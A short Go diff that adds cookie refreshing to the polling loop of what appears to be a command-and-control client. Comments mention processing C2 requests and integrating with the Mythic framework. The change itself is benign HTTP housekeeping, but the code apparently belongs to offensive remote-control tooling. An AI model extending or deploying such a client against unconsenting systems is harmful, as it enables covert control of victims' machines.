@@ -75,6 +75,13 @@ func (c *Client) poll() (*transport.Registration, error) {
 		reg := Registration(c.Response())
 		return reg, nil
 	}
+	if len(resp.Cookies()) > 0 {
+		// set new cookies if we received any, and remove old ones
+		c.cookieJar = []*http.Cookie{}
+		for _, cookie := range resp.Cookies() {
+			c.cookieJar = append(c.cookieJar, cookie)
+		}
+	}
 	// TODO: Process c2 req (resp) using the router. Also, check out how much work it is to integrate with mythic
 	// TODO: from a code perspective, compared to this :)
 	taskReq := &transport.Request{}
